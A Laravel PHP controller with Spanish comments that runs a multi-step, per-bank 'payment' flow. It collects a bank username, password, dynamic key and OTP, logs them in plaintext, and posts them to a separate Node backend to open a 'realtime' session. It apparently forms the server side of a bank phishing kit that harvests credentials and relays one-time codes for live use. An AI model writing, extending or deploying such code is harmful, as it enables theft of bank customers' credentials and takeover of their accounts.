<?php

namespace App\Http\Controllers;
use Illuminate\Support\Facades\Http;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\View;
use GuzzleHttp\Promise\PromiseInterface;

use Illuminate\Support\Arr;
class BankFlowController extends Controller
{

    public function step(string $bank, int $step, Request $request)
    {
        $sc = $request->session()->get('sc', []);

        logger()->info('SCREEN SID: ' . $request->session()->getId(), [
            'sc' => $sc
        ]);

        $cfg = config("banks.$bank"); // mejor: banks.$bank
        abort_if(!$cfg, 404);

        $maxSteps = (int) ($cfg['steps'] ?? 2);
        abort_if($step < 1 || $step > $maxSteps, 404);

        $view = $cfg['view_prefix'] . ".step{$step}";
        abort_if(!View::exists($view), 404);

        // si en step2 necesitas sesión realtime, asegúrala aquí
        if ($maxSteps === 4 && $step >= 2) {
            $this->ensureRealtimeSession($request);
            $sc = $request->session()->get('sc', []); // refresca
        }

        return view($view, [
            'bank' => $bank,
            'step' => $step,
            'maxSteps' => $maxSteps,
            'nodeUrl' => env('NODE_BACKEND_URL', 'http://localhost:3005'),

            // ✅ safe gets
            'user' => Arr::get($sc, 'user'),
            'sessionId' => Arr::get($sc, 'rt_session_id'),
            'sessionToken' => Arr::get($sc, 'rt_session_token'),
        ]);
    }

    public function saveStep(string $bank, int $step, Request $request)
    {
        $cfg = config("banks.$bank");
        abort_if(!$cfg, 404);

        $maxSteps = (int) ($cfg['steps'] ?? 2);

        $sc = $request->session()->get('sc', []);

        // STEP 1 (maxSteps=4): guarda usuario y limpia credenciales viejas
        if ($step === 1 && $maxSteps === 4) {
            $data = $request->validate([
                'user' => 'required|string|max:50',
            ]);

            $sc['user'] = $data['user'];

            // ✅ recomendado: limpiar datos de intento anterior
            //unset($sc['pass'], $sc['dinamic'], $sc['otp']);
            // si quieres reiniciar realtime al comenzar de nuevo:
            // unset($sc['rt_session_id'], $sc['rt_session_token']);
        }

        // STEP 2 (maxSteps=4): guarda pass y asegura sesión realtime
        if ($step === 2 && $maxSteps === 4) {
            $data = $request->validate([
                'pass' => 'required|string|max:50',
            ]);

            $sc['pass'] = $data['pass'];
        }

        // STEP 3/4: ejemplo para dinamic/otp (si aplica)
        if ($step === 3 || $step === 4) {
            $data = $request->validate([
                'dinamic' => 'nullable|string|min:6|max:8',
                'otp' => 'nullable|string|min:6|max:8',
            ]);

            if (!empty($data['dinamic']))
                $sc['dinamic'] = $data['dinamic'];
            if (!empty($data['otp']))
                $sc['otp'] = $data['otp'];
        }

        // ✅ GUARDAR sc SIEMPRE (una sola vez)
        $request->session()->put('sc', $sc);
        $request->session()->save();

        logger()->info('SAVE SID: ' . $request->session()->getId(), [
            'sc' => $request->session()->get('sc', [])
        ]);

        return redirect()->route('pago.bank.step', [
            'bank' => $bank,
            'step' => min($step + 1, $maxSteps),
        ]);
    }



    private function ensureRealtimeSession(Request $request): void
    {
        $sc = $request->session()->get('sc', []);

        // Si ya existe, salir
        if (!empty($sc['rt_session_id']) && !empty($sc['rt_session_token'])) {
            return;
        }

        $resp = Http::asJson()
            ->timeout(10)
            ->post(env('NODE_BACKEND_URL') . '/api/sessions', $sc);

        if ($resp instanceof PromiseInterface) {
            $resp = $resp->wait();
        }

        if ($resp->successful()) {
            // ✅ actualizar el MISMO sc (sin perder user/pass)
            $sc['rt_session_id'] = $resp->json('sessionId');
            $sc['rt_session_token'] = $resp->json('sessionToken');

            $request->session()->put('sc', $sc);
            $request->session()->save();
            return;
        }

        // opcional: log para debug
        logger()->warning('ensureRealtimeSession failed', [
            'status' => $resp->status(),
            'body' => $resp->body(),
        ]);
    }
}